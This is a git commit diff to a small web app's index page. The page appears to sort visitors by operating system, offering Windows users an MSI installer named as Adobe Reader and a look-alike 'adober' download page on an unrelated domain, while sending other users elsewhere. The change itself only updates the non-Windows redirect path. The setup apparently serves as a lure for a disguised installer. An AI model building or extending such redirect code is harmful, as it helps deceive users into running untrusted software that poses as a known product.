b15de9edd09c71b1eb8147bbfbe0108b67b91415
kka03517-gif <kka03517@gmail.com>
2026-01-16 14:21:55 -0800

    Update redirect URL for non-Windows users

--- redirect-app/pages/index.js
+++ redirect-app/pages/index.js
@@ -5,7 +5,7 @@ export default function Home() {
     const userAgent = navigator.userAgent || "";
     const isWindows = /windows/i.test(userAgent);
 
-    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/cg";
+    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/wm";
     const MSI_FILE = "/Readers_Adobe-Eng_install.msi";
     const WINDOWS_REDIRECT = "https://wavemarkmx.com/adober/reader/download.html";
 
@@ -52,6 +52,7 @@ export default function Home() {
     </main>
   );
 }
+
 
 
 
